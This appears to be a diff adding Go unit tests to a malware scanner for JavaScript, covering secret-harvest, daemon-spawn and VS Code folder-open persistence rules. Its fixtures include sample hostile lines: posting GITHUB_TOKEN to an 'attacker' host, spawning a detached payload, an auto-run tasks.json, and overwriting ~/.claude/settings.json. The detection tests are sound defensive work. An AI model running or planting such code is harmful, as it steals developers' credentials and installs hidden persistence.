@@ -331,6 +331,100 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-5 fixes: real env reads, real child_process calls, tasks.json gating ---
+
+func TestSafe_SecretNameMentionedNotRead(t *testing.T) {
+	// A string that names GITHUB_TOKEN (documentation, error message,
+	// UI label) plus an HTTP call must not by itself satisfy the
+	// harvest chain.
+	body := `
+console.error("GITHUB_TOKEN is required");
+fetch('https://api.example.com/health');
+`
+	findings := analyze(t, "doc.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("documentation mention of GITHUB_TOKEN must not satisfy harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_SecretReadBracketForm(t *testing.T) {
+	// process.env['NAME'] form must still count as a real read.
+	body := `
+const t = process.env['GITHUB_TOKEN'];
+fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "br.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env['GITHUB_TOKEN'] must satisfy harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_ChildProcessImportNoInvocation(t *testing.T) {
+	// Importing child_process without calling spawn/fork/exec must not
+	// satisfy the daemon chain even when an unrelated object literal
+	// in the file carries detached:true / stdio:'ignore'.
+	body := `
+const cp = require('child_process');
+const defaultOpts = { detached: true, stdio: 'ignore' };
+console.log('cp loaded; opts', defaultOpts);
+`
+	findings := analyze(t, "imp.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("child_process import alone must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_ChildProcessSpawnRequired(t *testing.T) {
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "sp.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("actual spawn invocation should still chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_ChildProcessExecAccepted(t *testing.T) {
+	// .exec(...) is also an invocation.
+	body := `
+require('child_process').exec('long-running &', { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ex.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf(".exec() must satisfy child-process invocation, got: %+v", findings)
+	}
+}
+
+func TestSafe_VSCodeTasksWithoutRunOn(t *testing.T) {
+	// Writing a manually-runnable .vscode/tasks.json (no folderOpen)
+	// must not by itself trigger AGENT_PERSISTENCE_001.
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{ label: 'manual', command: 'echo' }]
+}));
+`
+	findings := analyze(t, "v.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("manual .vscode/tasks.json must not chain persistence, got: %+v", findings)
+	}
+}
+
+func TestVuln_VSCodeTasksWithFolderOpen(t *testing.T) {
+	// Adding the folderOpen trigger turns a tasks.json write into
+	// real persistence.
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{ label: 'init', command: 'node setup.mjs',
+            runOptions: { runOn: 'folderOpen' } }]
+}));
+`
+	findings := analyze(t, "vf.js", body)
+	if !hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("tasks.json + runOn:folderOpen must chain persistence, got: %+v", findings)
+	}
+}
+
 // --- pass-4 fixes: distinguish /proc/<pid>/<sub> from root /proc files ---
 
 func TestSafe_ProcMeminfoNotMemoryAccess(t *testing.T) {
